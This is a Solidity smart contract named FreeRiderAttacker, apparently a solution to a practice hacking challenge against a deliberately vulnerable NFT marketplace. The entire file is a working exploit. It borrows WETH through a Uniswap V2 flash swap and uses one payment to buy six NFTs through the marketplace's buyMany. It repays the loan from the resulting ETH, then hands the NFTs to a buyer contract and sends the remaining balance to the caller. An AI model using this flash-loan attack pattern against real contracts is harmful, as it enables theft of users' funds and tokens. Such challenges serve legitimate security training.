// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/utils/Address.sol";


interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function approve(address guy, uint wad) external returns (bool);
}


interface IUniswapV2Pair {
  function token0() external view returns (address);

  function token1() external view returns (address);

  function swap(
    uint amount0Out,
    uint amount1Out,
    address to,
    bytes calldata data
  ) external;
}

interface IUniswapV2Factory {
  function getPair(address token0, address token1) external view returns (address);
}

interface IUniswapV2Callee {
  function uniswapV2Call(
    address sender,
    uint amount0,
    uint amount1,
    bytes calldata data
  ) external;
}

contract FreeRiderAttacker is IUniswapV2Callee {
    using Address for address payable;
  // Uniswap V2 router
  // 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
  address public immutable WETH;
  // Uniswap V2 factory
  address public immutable FACTORY;
  address public immutable marketplace;

  constructor(address _weth, address _factory, address _marketplace) {
      WETH = _weth;
      FACTORY = _factory;
      marketplace = _marketplace;
  }

  function attack(address _weth, address token1, uint256 _amount) public {
    require(_weth == WETH, "Put weth in token0");
    address pair = IUniswapV2Factory(FACTORY).getPair(_weth, token1);
    require(pair != address(0), "!pair");

    // need to pass some data to trigger uniswapV2Call
    bytes memory data = abi.encode(_weth, _amount);

    IUniswapV2Pair(pair).swap(_amount, 0, address(this), data);
  }

    // called by pair contract
  function uniswapV2Call(
    address _sender,
    uint _amount0,
    uint _amount1,
    bytes calldata _data
  ) external override { 
    address token0 = IUniswapV2Pair(msg.sender).token0();
    address token1 = IUniswapV2Pair(msg.sender).token1();
    address pair = IUniswapV2Factory(FACTORY).getPair(token0, token1);
    require(msg.sender == pair, "!pair");
    require(_sender == address(this), "!sender");

    (address _weth, uint amount) = abi.decode(_data, (address, uint));

    require(amount == _amount0, "Amounts not equal");

    // about 0.3%
    uint fee = ((amount * 3) / 997) + 1;
    uint amountToRepay = amount + fee;

    // convert weth to native eth
    IWETH9(token0).approve(_weth, amount);
    IWETH9(token0).withdraw(amount);

    uint[] memory tokenIds = new uint[](6);
    for (uint i; i <=5; i++) {
        tokenIds[i] = i;
    }
    FreeRiderNFTMarketplace(payable(marketplace)).buyMany{value: amount}(tokenIds);

    // convert eth back to weth
    IWETH9(_weth).deposit{value: amountToRepay}();

    IERC20(_weth).transfer(pair, amountToRepay);
  }

  function getPayment(address _freeRiderBuyer, address _nft) public {
      // send nfts to freeRiderbuyer
        for (uint i; i <=5; i++) {
            IERC721(_nft).safeTransferFrom(address(this), _freeRiderBuyer, i);
        }

        // send the 45 eth to the msg.sender
        payable(msg.sender).sendValue(address(this).balance);
  }

  function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    )
    external
    returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

  fallback() external payable {

  }

  receive() external payable {

  }
}